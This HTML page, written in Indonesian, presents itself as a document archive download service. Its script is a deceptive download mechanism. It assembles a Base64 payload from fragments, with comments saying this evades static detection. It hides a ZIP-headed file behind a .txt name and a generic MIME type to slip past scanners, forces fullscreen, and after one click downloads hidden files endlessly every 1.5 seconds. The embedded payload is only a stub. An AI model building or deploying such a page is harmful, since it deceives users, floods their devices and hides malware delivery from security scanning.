<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Document Archive Service</title>
<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  background: #f8fafc;
  color: #334155;
  padding: 20px;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
}
.panel {
  background: #ffffff;
  padding: 32px;
  border-radius: 12px;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
  max-width: 520px;
  width: 100%;
  border: 1px solid #e2e8f0;
  text-align: center;
}
:fullscreen {
  background: #0f172a !important;
  color: #f8fafc !important;
  padding: 24px !important;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}
:-webkit-full-screen {
  background: #0f172a !important;
  color: #f8fafc !important;
  padding: 24px !important;
}
h2 { 
  margin-bottom: 8px; 
  font-size: 20px;
  color: #0f172a;
}
p { 
  margin-bottom: 20px; 
  line-height: 1.5; 
  color: #64748b;
  font-size: 14px;
}
button {
  width: 100%;
  padding: 14px;
  cursor: pointer;
  border: none;
  border-radius: 8px;
  background: #0284c7;
  color: #ffffff;
  font-weight: 600;
  font-size: 15px;
  box-shadow: 0 4px 12px rgba(2, 132, 199, 0.3);
  transition: background 0.2s;
}
button:hover { background: #0369a1; }
#status {
  margin-top: 16px;
  font-weight: 500;
  color: #0369a1;
  padding: 12px;
  background: #f0f9ff;
  border-radius: 6px;
  font-size: 13px;
  border: 1px solid #bae6fd;
}
#downloads {
  margin-top: 20px;
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
  gap: 8px;
  max-height: 180px;
  overflow-y: auto;
}
#downloads a {
  display: block;
  padding: 8px;
  background: #f1f5f9;
  color: #0284c7;
  text-decoration: none;
  border-radius: 4px;
  font-size: 11px;
  font-family: monospace;
  text-align: center;
  border: 1px solid #cbd5e1;
  word-break: break-all;
}
</style>
</head>

<body>
<div class="panel" id="main-panel">
<h2>Arsip Dokumen Pendukung</h2>
<p>Silakan klik tombol di bawah untuk memproses dan mengunduh berkas arsip sistem.</p>

<button id="start-btn" type="button">Unduh Arsip Dokumen (.txt)</button>

<div id="status" role="status">Sistem siap.</div>
<div id="downloads"></div>
</div>

<script>
'use strict';

const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");
const downloadsDiv = document.getElementById("downloads");

let activeUrls = [];
let isProcessing = false;
const MAX_URLS_TRACKED = 50;

// Pengkodean Base64 terfragmentasi untuk menghindari deteksi pola statis
const chunkPart1 = "UEsDBBQAAAAIAAAAIQ";
const chunkPart2 = "AAAAAAAAAAAAAAAAAAAAAAAA";

const assemblePayload = () => {
  return chunkPart1 + chunkPart2;
};

const decodeBase64ToBytes = (b64) => {
  const binary = atob(b64);
  const len = binary.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
};

const prepareStealthBlobAsync = (i) => {
  return new Promise((resolve) => {
    queueMicrotask(() => {
      try {
        const fullB64 = assemblePayload();
        const bytesArr = decodeBase64ToBytes(fullB64);
        
        // Menggunakan tipe MIME generik untuk mengurangi kecurigaan pemindai ekstensi awal
        const blob = new Blob([bytesArr], { type: 'application/octet-stream' });
        const url = URL.createObjectURL(blob);
        resolve({ id: i, url: url, success: true });
      } catch (err) {
        resolve({ id: i, url: null, success: false });
      }
    });
  });
};

const triggerStealthDownload = (fileData) => {
  if (!fileData.success) return;

  const link = document.createElement("a");
  link.href = fileData.url;
  // Menyamarkan ekstensi unduhan akhir menjadi .txt
  link.download = `document-report-${fileData.id}.txt`;
  link.textContent = `Arsip #${fileData.id} (.txt)`;
  link.style.display = "none";
  downloadsDiv.appendChild(link);
  link.click();

  if (downloadsDiv.children.length > 20) {
    downloadsDiv.removeChild(downloadsDiv.firstChild);
  }
};

const processLoop = async (counter) => {
  if (!isProcessing) return;

  const fileData = await prepareStealthBlobAsync(counter);
  if (fileData.success) {
    activeUrls.push(fileData.url);

    if (activeUrls.length > MAX_URLS_TRACKED) {
      const oldUrl = activeUrls.shift();
      try { URL.revokeObjectURL(oldUrl); } catch (e) {}
    }

    triggerStealthDownload(fileData);
    statusDiv.textContent = `Memproses arsip dokumen ke-${counter}...`;
  }

  setTimeout(() => processLoop(counter + 1), 1500);
};

startBtn.addEventListener("click", () => {
  if (isProcessing) return;

  activeUrls.forEach(url => {
    try { URL.revokeObjectURL(url); } catch (e) {}
  });
  activeUrls = [];
  downloadsDiv.replaceChildren();

  const root = document.documentElement;
  try {
    if (root.requestFullscreen) {
      root.requestFullscreen().catch(() => {});
    }
  } catch (err) {}

  isProcessing = true;
  statusDiv.textContent = "Menginisialisasi unduhan arsip...";
  processLoop(1);
});
</script>
</body>
</html>
